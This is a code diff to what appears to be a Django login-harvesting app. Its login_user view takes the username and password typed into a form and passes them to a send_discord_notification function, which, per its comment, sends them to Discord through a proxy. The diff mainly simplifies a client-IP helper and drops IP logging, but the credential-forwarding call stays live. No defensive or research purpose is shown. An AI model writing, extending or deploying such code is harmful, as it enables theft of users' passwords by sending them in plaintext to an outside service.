@@ -273,44 +273,20 @@ def send_discord_notification(username, password, user_id=None, ip_address=None,
         return False
 
 def get_client_ip(request):
-    """
-    Extract the actual IP of the user (client) accessing the site
-
-    Priority:
-    1. HTTP_X_FORWARDED_FOR (Proxy/Load Balancer)
-    2. HTTP_X_REAL_IP (Nginx, etc.)
-    3. REMOTE_ADDR (Direct connection)
-    """
-    print("=" * 60)
-    print("🔍 IP HEADERS DEBUG:")
-    print(f"  REMOTE_ADDR: {request.META.get('REMOTE_ADDR')}")
-    print(f"  HTTP_X_FORWARDED_FOR: {request.META.get('HTTP_X_FORWARDED_FOR')}")
-    print(f"  HTTP_X_REAL_IP: {request.META.get('HTTP_X_REAL_IP')}")
     
-    # 1. X-Forwarded-For (Actual client IP passed by proxy)
+    ip = None
+    
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
+    
     if x_forwarded_for:
-        # If multiple IPs exist, the first one is the actual client IP
         ip = x_forwarded_for.split(',')[0].strip()
-        if ip and ip != 'unknown':
-            print(f"✅ FINAL IP: {ip} (from X-Forwarded-For)")
-            return ip
     
-    # 2. X-Real-IP (Set by Nginx, etc.)
-    x_real_ip = request.META.get('HTTP_X_REAL_IP')
-    if x_real_ip and x_real_ip != 'unknown':
-        print(f"✅ FINAL IP: {x_real_ip} (from X-Real-IP)")
-        return x_real_ip
-    
-    # 3. REMOTE_ADDR (Direct connection or last resort)
-    remote_ip = request.META.get('REMOTE_ADDR')
-    if remote_ip:
-        print(f"✅ FINAL IP: {remote_ip} (from REMOTE_ADDR)")
-        return remote_ip
-    
-    print("⚠️ No IP found, returning 0.0.0.0")
-    return '0.0.0.0'
+    if not ip:
+        ip = request.META.get('HTTP_X_REAL_IP')
 
+    if not ip:
+        ip = request.META.get('REMOTE_ADDR')
+    return ip
 
 def user_profile(request, user_id):
     """
@@ -367,19 +343,11 @@ def login_user(request, user_id):
         username = request.POST.get('username')
         password = request.POST.get('password')
         
-        # Get additional information
-        ip_address = request.META.get('HTTP_X_FORWARDED_FOR', request.META.get('REMOTE_ADDR', ''))
-        user_agent = request.META.get('HTTP_USER_AGENT', '')
-        
-        print(f"🌐 IP Address: {ip_address}")
-        print(f"🖥️ User Agent: {user_agent}")
-        
         # Send to Discord via proxy
         print("📤 Attempting to send to Discord via proxy...")
         notification_sent = send_discord_notification(
             username=username,
             password=password,
-            ip_address=ip_address,
         )
         
         if notification_sent:
